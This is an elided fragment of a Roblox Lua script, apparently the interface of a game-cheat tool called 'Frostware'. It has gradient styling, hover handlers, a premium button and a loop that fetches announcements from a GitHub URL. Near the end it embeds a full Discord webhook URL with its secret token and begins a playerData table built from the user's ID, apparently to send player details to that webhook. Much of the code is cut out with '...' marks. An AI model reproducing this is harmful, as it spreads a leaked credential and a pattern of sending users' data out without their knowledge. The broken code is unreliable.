...
UIGradient.Color =
    ...
    ColorSequenceKeypoint.new(0.30, Color3.fromRGB(32, 16, 255)),
...
spawn(
    function()
        while wait() do
            local anc =
                game:HttpGet("https://raw.githubusercontent.com/Jake-Brock/Scripts/main/static/announcements.txt")
            Announce.Text = "Developer Announcement:\n\n" .. anc
            task.wait(10)
        end
    end
...
ActivatePremiumButton.MouseButton1Click:Connect(
    function()
...
prembtn.MouseButton1Down:Connect(
    function()
        for i, v in pairs(Frostware.Background:GetChildren()) do
            if v:IsA("Frame") or v:IsA("ScrollingFrame") then
                v.Visible = false
...
Gradient.Color =
    ColorSequence.new {
    ColorSequenceKeypoint.new(0.00, Color3.fromRGB(0, 0, 255)),
    ColorSequenceKeypoint.new(0.39, Color3.fromRGB(98, 114, 255)),
    ColorSequenceKeypoint.new(0.59, Color3.fromRGB(206, 206, 206)),
    ColorSequenceKeypoint.new(1.00, Color3.fromRGB(17, 43, 127))
}
...
local function BFSYBW_fake_script() -- Toggle.LocalScript
    ...
    UI.MouseEnter:Connect(
        function()
            Hovered = true
        end
    )

    UI.MouseLeave:Connect(
        function()
            Hovered = false
        end
    )
...
local function KEKRDU_fake_script()
    ...
    script.Parent.MouseLeave:Connect(
        function()
...
local webhookUrl =
    "https://discord.com/api/webhooks/1322287456552357938/rEctQ9E1n8M2dzrPEM0BeD26vkmhL73sFzOiuFh5mxpt-Za6P-R-GyzhTSxq-tywjoGy"
...
local playerData = {
    ...
    ProfileImage = "https://www.roblox.com/headshot-thumbnail/image?userId=" ..
